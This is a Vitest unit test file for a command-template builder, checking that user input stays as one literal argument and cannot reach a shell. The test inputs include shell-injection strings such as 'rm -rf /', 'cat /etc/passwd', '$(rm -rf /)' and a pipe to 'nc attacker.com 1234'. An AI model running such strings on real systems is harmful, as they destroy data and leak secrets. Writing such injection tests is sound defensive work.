/**
 * Command service unit tests
 *
 * CRITICAL: Tests verify that user input cannot escape to shell
 */
import { describe, it, expect } from "vitest";
import { buildCommand } from "./command.js";

describe("buildCommand", () => {
  it("substitutes single placeholder", () => {
    const template = ["echo", "{text}"];
    const result = buildCommand(template, { text: "hello world" });
    expect(result).toEqual(["echo", "hello world"]);
  });

  it("substitutes multiple placeholders", () => {
    const template = ["cmd", "--task={task}", "--sha={sha}"];
    const result = buildCommand(template, { task: "fix-bug", sha: "abc123" });
    expect(result).toEqual(["cmd", "--task=fix-bug", "--sha=abc123"]);
  });

  it("leaves unmatched placeholders unchanged", () => {
    const template = ["cmd", "{task}", "{unknown}"];
    const result = buildCommand(template, { task: "my-task" });
    expect(result).toEqual(["cmd", "my-task", "{unknown}"]);
  });

  it("handles empty vars", () => {
    const template = ["cmd", "{text}"];
    const result = buildCommand(template, {});
    expect(result).toEqual(["cmd", "{text}"]);
  });

  // SECURITY: Shell injection prevention tests
  describe("shell injection prevention", () => {
    it("preserves semicolons as literal text (no command chaining)", () => {
      const template = ["echo", "{text}"];
      const result = buildCommand(template, { text: "hello; rm -rf /" });
      // The semicolon stays as part of the argument, never reaches a shell
      expect(result).toEqual(["echo", "hello; rm -rf /"]);
      expect(result.length).toBe(2); // Still just 2 args
    });

    it("preserves pipes as literal text", () => {
      const template = ["cmd", "{input}"];
      const result = buildCommand(template, {
        input: "data | cat /etc/passwd",
      });
      expect(result).toEqual(["cmd", "data | cat /etc/passwd"]);
      expect(result.length).toBe(2);
    });

    it("preserves backticks as literal text", () => {
      const template = ["run", "{code}"];
      const result = buildCommand(template, { code: "`whoami`" });
      expect(result).toEqual(["run", "`whoami`"]);
    });

    it("preserves $() as literal text", () => {
      const template = ["exec", "{script}"];
      const result = buildCommand(template, { script: "$(rm -rf /)" });
      expect(result).toEqual(["exec", "$(rm -rf /)"]);
    });

    it("preserves && as literal text", () => {
      const template = ["bash", "-c", "{cmd}"];
      const result = buildCommand(template, { cmd: "ls && rm -rf /" });
      // buildCommand only keeps the value as ONE argv element; it does not
      // make it safe. `bash -c` EXECUTES that argument as a shell script, so
      // this template would run `rm -rf /`. Never put a placeholder in the
      // script argument of a shell (`sh -c`, `bash -c`) or an interpreter
      // (`node -e`, `python -c`): pass user values only as plain arguments.
      expect(result).toEqual(["bash", "-c", "ls && rm -rf /"]);
    });

    it("preserves newlines as literal text", () => {
      const template = ["echo", "{msg}"];
      const result = buildCommand(template, { msg: "line1\nline2" });
      expect(result).toEqual(["echo", "line1\nline2"]);
      expect(result[1]).toContain("\n");
    });

    it("preserves quotes as literal text", () => {
      const template = ["say", "{phrase}"];
      const result = buildCommand(template, { phrase: 'He said "hello"' });
      expect(result).toEqual(["say", 'He said "hello"']);
    });

    it("preserves glob patterns as literal text", () => {
      const template = ["rm", "{path}"];
      const result = buildCommand(template, { path: "/*" });
      expect(result).toEqual(["rm", "/*"]);
    });

    it("user text stays as ONE argument", () => {
      const template = ["script", "--input", "{text}"];
      const malicious =
        "foo bar; rm -rf / && echo pwned | nc attacker.com 1234";
      const result = buildCommand(template, { text: malicious });

      // The entire malicious string is ONE argument
      expect(result).toHaveLength(3);
      expect(result[2]).toBe(malicious);
    });
  });
});
